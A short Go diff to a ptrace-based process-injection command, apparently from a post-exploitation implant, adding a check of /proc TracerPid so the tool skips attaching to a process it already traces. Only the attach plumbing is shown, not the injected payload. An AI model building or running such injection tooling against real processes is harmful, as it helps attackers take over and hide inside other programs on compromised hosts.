@@ -108,15 +108,20 @@ func ptraceInject(args ptraceInjectArgs) structs.CommandResult {
 	runtime.LockOSThread()
 	defer runtime.UnlockOSThread()
 
-	sb.WriteString(fmt.Sprintf("[*] PTRACE_ATTACH to PID %d...\n", args.PID))
-	if err := syscall.PtraceAttach(args.PID); err != nil {
-		return errorResult(sb.String() + fmt.Sprintf("[!] PTRACE_ATTACH failed: %v\n", err))
-	}
+	alreadyTraced := isTracedByUs(args.PID)
 
 	var ws syscall.WaitStatus
-	if _, err := syscall.Wait4(args.PID, &ws, 0, nil); err != nil {
-		_ = syscall.PtraceDetach(args.PID)
-		return errorResult(sb.String() + fmt.Sprintf("[!] Wait4 failed: %v\n", err))
+	if alreadyTraced {
+		sb.WriteString(fmt.Sprintf("[*] PID %d already traced by us (e.g. from spawn), skipping PTRACE_ATTACH\n", args.PID))
+	} else {
+		sb.WriteString(fmt.Sprintf("[*] PTRACE_ATTACH to PID %d...\n", args.PID))
+		if err := syscall.PtraceAttach(args.PID); err != nil {
+			return errorResult(sb.String() + fmt.Sprintf("[!] PTRACE_ATTACH failed: %v\n", err))
+		}
+		if _, err := syscall.Wait4(args.PID, &ws, 0, nil); err != nil {
+			_ = syscall.PtraceDetach(args.PID)
+			return errorResult(sb.String() + fmt.Sprintf("[!] Wait4 failed: %v\n", err))
+		}
 	}
 	sb.WriteString("[+] Process stopped\n")
 
@@ -280,4 +285,21 @@ func ptraceInject(args ptraceInjectArgs) structs.CommandResult {
 	sb.WriteString("[+] Ptrace injection completed successfully\n")
 
 	return successResult(sb.String())
+}
+
+func isTracedByUs(pid int) bool {
+	data, err := os.ReadFile(fmt.Sprintf("/proc/%d/status", pid))
+	if err != nil {
+		return false
+	}
+	myPid := os.Getpid()
+	for _, line := range strings.Split(string(data), "\n") {
+		if strings.HasPrefix(line, "TracerPid:") {
+			var tracerPid int
+			if _, err := fmt.Sscanf(line, "TracerPid:\t%d", &tracerPid); err == nil {
+				return tracerPid == myPid
+			}
+		}
+	}
+	return false
 }
